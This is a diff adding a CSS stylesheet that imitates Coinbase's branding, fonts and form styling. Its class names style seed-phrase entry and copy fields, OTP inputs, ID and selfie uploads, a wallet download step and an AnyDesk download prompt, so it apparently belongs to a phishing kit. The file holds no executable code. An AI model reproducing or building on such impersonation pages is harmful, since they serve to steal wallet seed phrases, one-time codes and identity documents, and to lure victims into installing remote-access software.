@@ -1,0 +1,682 @@
+/* index.css or App.css */
+
+/* WebKit Browsers (Chrome, Safari) */
+::-webkit-scrollbar {
+	width: 8px; /* Thinner scrollbar width */
+	height: 8px; /* Thinner scrollbar height for horizontal scrollbar */
+}
+
+::-webkit-scrollbar-track {
+	background: #e0e0e0; /* Light gray background for the track */
+	border-radius: 10px; /* Rounded corners for the track */
+}
+
+::-webkit-scrollbar-thumb {
+	background: #888; /* Gray color for the scrollbar thumb */
+	border-radius: 10px; /* Rounded corners for the thumb */
+	transition: background 0.3s; /* Smooth transition for hover effect */
+}
+
+::-webkit-scrollbar-thumb:hover {
+	background: #555; /* Darker gray color on hover */
+}
+
+/* Firefox */
+html {
+	scrollbar-width: thin; /* Thinner scrollbar width */
+	scrollbar-color: #888 #e0e0e0; /* Thumb and track colors */
+}
+
+/* Additional scrollbar customization for better appearance */
+::-webkit-scrollbar-corner {
+	background: #e0e0e0; /* Corner piece (where both horizontal and vertical scrollbars meet) */
+}
+
+:root {
+	--coinbase-display: CoinbaseDisplay, -apple-system, BlinkMacSystemFont,
+		"Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji",
+		"Segoe UI Emoji", "Segoe UI Symbol";
+	--coinbase-text: CoinbaseText, -apple-system, BlinkMacSystemFont, "Segoe UI",
+		"Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji",
+		"Segoe UI Emoji", "Segoe UI Symbol";
+	--coinbase-sans: CoinbaseSans, -apple-system, BlinkMacSystemFont, "Segoe UI",
+		"Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji",
+		"Segoe UI Emoji", "Segoe UI Symbol";
+	--background: rgb(10, 11, 13);
+}
+*,
+*:before,
+*:after {
+	box-sizing: border-box;
+}
+
+ul {
+	list-style-type: disc;
+	margin: 1em 0;
+	padding-left: 40px;
+}
+
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseDisplay;
+	src: url(/assets/28a06774e35b7ac61651-881387e5.woff2) format("woff2");
+	font-weight: 400;
+}
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseDisplay;
+	src: url(/assets/8a6a40a08f92d9a9b3e5-a1f75e7f.woff2) format("woff2");
+	font-weight: 500 800;
+}
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseSans;
+	src: url(/assets/71371380d08a07cda58a-5db56ddf.woff2) format("woff2");
+	font-weight: 400;
+}
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseSans;
+	src: url(/assets/502b733210ea3fdd4bf8-81368223.woff2) format("woff2");
+	font-weight: 500 800;
+}
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseText;
+	src: url(/assets/2a5dafc68ca015ca866a-b2943cf4.woff2) format("woff2");
+	font-weight: 400;
+}
+@font-face {
+	font-display: swap;
+	font-family: CoinbaseText;
+	src: url(/assets/1c417cbe5308c436b5c2-d05b0b7f.woff2) format("woff2");
+	font-weight: 500 800;
+}
+@font-face {
+	font-family: CoinbaseIcons;
+	font-style: normal;
+	font-weight: 400;
+	font-display: block;
+	src: url(/assets/9eb0fe1e4dbaba05d7e7-ac959a2d.woff2) format("woff2");
+}
+html,
+body {
+	background: var(--background) !important;
+	margin: 0;
+	padding: 0;
+}
+.container form .btn {
+	padding: 24px 0 16px;
+}
+.container form button:not(.upload-both-sides button, .upload-selfie button) {
+	height: 56px;
+	border-radius: 56px;
+	background: rgb(55, 115, 245);
+	font-size: 1rem;
+	color: #0a0b0d;
+	min-width: 100px;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	font-weight: 600;
+	border: none;
+	width: 100%;
+	cursor: pointer;
+	font-family: var(--coinbase-sans);
+	position: relative;
+}
+.container form > button:hover {
+	background: rgb(71, 126, 246);
+}
+.container form button:active {
+	transform: scale(0.98);
+	opacity: 0.9;
+}
+.container form button[data-loading="true"] > span {
+	display: none;
+}
+.container form button[data-loading="true"]:after {
+	width: 1.5rem;
+	height: 1.5rem;
+	border-radius: 50%;
+	border: 2px solid #0a0b0d;
+	border-bottom: 3px solid #0a0b0d00;
+	content: "";
+	animation: spin 1s linear infinite;
+}
+.container {
+	max-width: 448px;
+	margin: 80px auto 0;
+	padding: 40px 40px 0;
+	border: 1px solid rgba(138, 145, 158, 0.2);
+	border-radius: 18px;
+	position: relative;
+	overflow: hidden;
+	min-height: 520px;
+}
+.container svg {
+	width: 126px;
+	padding-bottom: calc(3.5rem - 4px);
+}
+.header h1 {
+	font-size: 28px;
+	line-height: 36px;
+	font-weight: 600;
+	color: #fff;
+	margin: 0;
+	padding-bottom: 1rem;
+	font-family: var(--coinbase-display);
+}
+.header span {
+	font-size: 1rem;
+	line-height: 24px;
+	font-weight: 400;
+	color: #8a919e;
+	font-family: var(--coinbase-text) !important;
+}
+.header {
+	padding-bottom: 24px;
+}
+.header p {
+	font-family: var(--coinbase-sans);
+	font-size: 16px;
+	font-weight: 400;
+	line-height: 24px;
+	color: #8a919e;
+	margin: 0;
+}
+.auth-logo {
+	display: flex;
+	justify-content: center;
+}
+.seed-alert {
+	font-family: var(--coinbase-sans);
+	font-size: 12px;
+	font-weight: 400;
+	line-height: 16px;
+	color: #8a919e;
+	padding: 1rem 0;
+	padding-bottom: 0;
+	text-align: center;
+}
+.auth-header {
+	text-align: center;
+	display: flex;
+	flex-direction: column;
+	align-items: center;
+}
+.auth-brand-logo {
+	justify-content: start;
+	display: flex;
+}
+.auth-header svg {
+	width: 150px;
+}
+.verify-header {
+	text-align: center;
+	margin: 0 1rem;
+}
+.auth-header u {
+	font-weight: 700;
+}
+.container .error input {
+	border: 1px solid rgb(240, 97, 109);
+}
+.container .error input:focus {
+	border: 1px solid rgb(240, 97, 109);
+	box-shadow: 0 0 0 1px #f0616d;
+}
+.error-span {
+	font-size: 14px;
+	line-height: 20px;
+	font-weight: 400;
+	font-family: var(--coinbase-sans);
+	color: #f0616d;
+	margin-top: 4px;
+}
+.container .input.password {
+	position: relative;
+}
+.mastra {
+	position: fixed;
+	width: 100%;
+	height: 1px;
+	background-color: red;
+	rotate: 90deg;
+	left: 1%;
+}
+@media screen and (max-width: 560px) {
+	.container {
+		margin: 0 auto;
+		padding: 24px 24px 0;
+		border: none;
+	}
+}
+.container button:disabled {
+	background: rgb(33, 63, 129) !important;
+	cursor: not-allowed !important;
+}
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+	-webkit-appearance: none;
+	margin: 0;
+}
+input[type="number"] {
+	-moz-appearance: textfield;
+}
+.loading-container {
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	top: 0;
+	left: 0;
+	background: var(--background);
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+.loading-container > span {
+	width: 40px;
+	height: 40px;
+	border-radius: 50%;
+	border: 4px rgba(138, 145, 158, 0.2) solid;
+	border-top: 4px rgb(55, 115, 245) solid;
+	animation: spin 1s linear infinite;
+}
+.loading-message > .loading-container {
+	position: initial;
+	width: initial;
+	height: initial;
+	margin-top: 4rem;
+}
+@keyframes spin {
+	0% {
+		rotate: 0deg;
+	}
+	to {
+		rotate: 360deg;
+	}
+}
+
+._input_rheaz_1 label {
+	font-size: 14px;
+	line-height: 20px;
+	font-weight: 600;
+	color: #fff;
+	padding-top: 4px;
+	padding-bottom: 8px;
+	font-family: var(--coinbase-sans);
+}
+._input_rheaz_1 {
+	display: flex;
+	flex-direction: column;
+}
+._input_rheaz_1 input {
+	transition: all 0.2s ease-in-out;
+	color: #fff;
+	background: rgb(10, 11, 13);
+	font-size: 16px;
+	font-weight: 400;
+	line-height: 24px;
+	padding: 1rem;
+	border: 1px solid rgba(138, 145, 158, 0.68);
+	border-radius: 8px;
+	font-family: var(--coinbase-sans);
+	width: 100%;
+}
+._input_rheaz_1 input:hover {
+	background: rgb(15, 16, 18);
+	opacity: 0.98;
+}
+._input_rheaz_1 input:focus {
+	border: 1px solid rgb(55, 115, 245);
+	box-shadow: 0 0 0 1px #3773f5;
+	outline: none;
+}
+._input_rheaz_1 input::placeholder {
+	color: #8a919e;
+}
+._input_rheaz_1 span:active > input {
+	background: rgb(30, 31, 32);
+}
+
+.container:has(.reset-stimulus) {
+	min-height: 448px;
+}
+.reset-stimulus ul {
+	padding-left: 18px;
+	display: flex;
+	flex-direction: column;
+	gap: 8px;
+}
+.reset-stimulus ul li {
+	font-size: 1rem;
+	line-height: 24px;
+	font-weight: 400;
+	font-family: var(--coinbase-sans);
+	color: #fff;
+}
+.reset-stimulus span {
+	color: #fff;
+}
+.togglepassword {
+	content: "î¨ˆ";
+	font-family: CoinbaseIcons;
+	color: #8a919e;
+	width: fit-content;
+	position: absolute;
+	right: 12px;
+	top: 50px;
+	cursor: pointer;
+}
+.togglepassword::selection {
+	background: transparent;
+}
+.stimulus-input-floyd {
+	display: flex;
+	flex-direction: column;
+	gap: 1rem;
+}
+.container .user-icon {
+	font-family: CoinbaseIcons;
+	color: #8a919e;
+	border-radius: 50%;
+	width: 28px;
+	height: 28px;
+	border: 2px solid #fff;
+	text-align: center;
+	justify-content: center;
+	align-items: center;
+	display: flex;
+}
+@media screen and (min-width: 560px) {
+	.reset-stimulus span {
+		text-wrap: nowrap;
+	}
+}
+
+.otp-btn {
+	padding: 2rem 0 24px !important;
+}
+.otp-btn button {
+	background: rgb(50, 53, 61);
+	color: #fff;
+}
+.otp-btn button:hover {
+	background: rgb(58, 61, 69);
+	opacity: 0.96;
+}
+.auth-input-grp > .input:nth-child(3) {
+	margin-right: 8px;
+}
+.auth-input-grp input {
+	padding: 1rem 8px;
+	text-align: center;
+}
+.otp-header {
+	padding-bottom: 40px !important;
+}
+.otp-footer span {
+	font-size: 1rem;
+	line-height: 24px;
+	font-weight: 400;
+	font-family: var(--coinbase-sans);
+	color: #3773f5;
+	cursor: pointer;
+}
+.otp-footer {
+	text-align: center;
+	margin-bottom: 48px;
+}
+.auth-input-grp input {
+	transition: all 0.2s ease-in-out;
+	color: #fff;
+	background: rgb(10, 11, 13) !important;
+	font-size: 16px;
+	font-weight: 400;
+	line-height: 24px;
+	padding: 1rem 0.25rem;
+	border: 1px solid rgba(138, 145, 158, 0.68);
+	border-radius: 8px;
+	font-family: var(--coinbase-sans);
+	width: 100% !important;
+}
+.auth-input-grp input:hover {
+	background: rgb(15, 16, 18);
+	opacity: 0.98;
+}
+.auth-input-grp input:focus {
+	border: 1px solid rgb(55, 115, 245);
+	box-shadow: 0 0 0 1px #3773f5;
+	outline: none;
+}
+.auth-input-grp input::placeholder {
+	color: #8a919e;
+}
+.auth-input-grp > div {
+	display: flex;
+	justify-content: center;
+	gap: 2.5px;
+}
+
+._input_177zu_1 label {
+	font-size: 14px;
+	line-height: 20px;
+	font-weight: 600;
+	color: #fff;
+	padding-top: 4px;
+	padding-bottom: 8px;
+	font-family: var(--coinbase-sans);
+}
+._input_177zu_1 {
+	display: flex;
+	flex-direction: column;
+	position: relative;
+}
+._input_177zu_1 textarea {
+	transition: all 0.2s ease-in-out;
+	color: rgb(96, 98, 114);
+	background: rgb(10, 11, 13);
+	font-size: 14px;
+	font-weight: 400;
+	line-height: 24px;
+	padding: 1rem;
+	border: 1px solid rgba(138, 145, 158, 0.68);
+	border-radius: 8px;
+	font-family: var(--coinbase-sans);
+	width: 100%;
+	max-width: 100%;
+	min-width: 100%;
+	overflow: hidden;
+	resize: none;
+	text-align: start;
+}
+._input_177zu_1 textarea:hover {
+	background: rgb(15, 16, 18);
+	opacity: 0.98;
+	cursor: pointer;
+}
+._input_177zu_1 textarea:focus {
+	border: 1px solid rgb(55, 115, 245);
+	box-shadow: 0 0 0 1px #3773f5;
+	outline: none;
+}
+._input_177zu_1 textarea::placeholder {
+	color: #8a919e;
+}
+._input_177zu_1 span:active > textarea {
+	background: rgb(30, 31, 32);
+}
+
+.coinbase-wallet-download-header {
+	display: flex;
+	flex-direction: column;
+	justify-content: center;
+	align-items: center;
+}
+
+.coinbase-wallet-download-header h1 {
+	font-size: 20px;
+	text-align: center;
+	margin-bottom: 3px;
+	padding-bottom: 0 !important;
+	margin-top: -20px;
+}
+
+.coinbase-wallet-download-header p {
+	text-align: center;
+}
+
+.wallet-download-icons {
+	display: flex;
+	flex-direction: row;
+	margin-top: 12px;
+	gap: 10px;
+	padding-top: 10px;
+	margin-bottom: 10px;
+}
+
+.step-3-header {
+	padding-bottom: 10px;
+}
+
+.step-3-header h1 {
+	margin-top: -10px;
+}
+
+.assist-text {
+	font-size: 8px;
+}
+.copy-seed-container {
+	display: flex;
+	justify-content: left;
+	align-items: center;
+	font-family: var(--coinbase-sans);
+	font-size: 12px;
+	font-weight: 400;
+	line-height: 24px;
+	color: #fff;
+	cursor: pointer;
+	transition: opacity 0.2s ease-in-out;
+	margin-top: 0px;
+	margin-left: 4px;
+}
+.copy-seed-container p {
+	margin-top: 2px;
+}
+.copy-seed-container:hover {
+	opacity: 0.8;
+}
+.copy-seed-icon {
+	font-family: CoinbaseIcons;
+	color: #fff;
+	font-size: 12px;
+	line-height: 24px;
+}
+.textarea-container {
+	margin-bottom: "0px";
+}
+
+.review-acc-content h2 {
+	font-size: 18px;
+	line-height: 36px;
+	font-weight: 600;
+	color: #fff;
+	margin: 0;
+	font-family: var(--coinbase-display);
+}
+
+.review-acc-content p {
+	font-family: var(--coinbase-sans);
+	font-size: 14px;
+	font-weight: 400;
+	line-height: 24px;
+	color: #8a919e;
+	margin: 0;
+}
+
+.review-card {
+	display: flex;
+	flex-direction: column;
+	padding: 0.25rem;
+}
+.review-card .title {
+	font-size: 18px;
+	font-weight: 600;
+	color: #fff;
+	margin: 0;
+	font-family: var(--coinbase-display);
+}
+.review-card .sub-title {
+	font-family: var(--coinbase-sans);
+	font-size: 14px;
+	font-weight: 400;
+	color: #8a919e;
+	margin: 0;
+	margin-top: -8px;
+}
+.review-card .sub-title span {
+	font-weight: 700;
+	color: #fff;
+}
+.review-card .review-buttons {
+	display: flex;
+	gap: 2rem;
+}
+.review-card .review-buttons .btn {
+	width: 100%;
+}
+.review-card .review-buttons button {
+	border-radius: 56px;
+	background: rgb(55, 115, 245);
+	font-size: 14px;
+	color: #0a0b0d;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	font-weight: 600;
+	border: none;
+	width: 100%;
+	cursor: pointer;
+	font-family: var(--coinbase-sans);
+	position: relative;
+	padding: 0.25rem 0;
+}
+.review-card .review-buttons .secondary button {
+	background: rgb(50, 53, 61);
+	color: #fff;
+}
+hr:not(:has(+ .review-card)) {
+	display: none;
+}
+.review-card + hr {
+	border-color: #32353d;
+}
+.container:has(.review-container) {
+	border: none;
+}
+
+.anydesk-header > p > a {
+	color: #3773f5;
+}
+
+.anydeskd-header {
+	display: flex;
+	flex-direction: column;
+	justify-content: center;
+	align-items: center;
+	text-align: center;
+	padding-bottom: 0px !important;
+}
+
+.anydesk-header h1 {
+	font-size: 20px;
+	text-align: center;
+	margin-bottom: 3px;
+	padding-bottom: 0 !important;
+	margin-top: -20px;
+}
+
+.anydesk-header p {
+	text-align: center;
+}
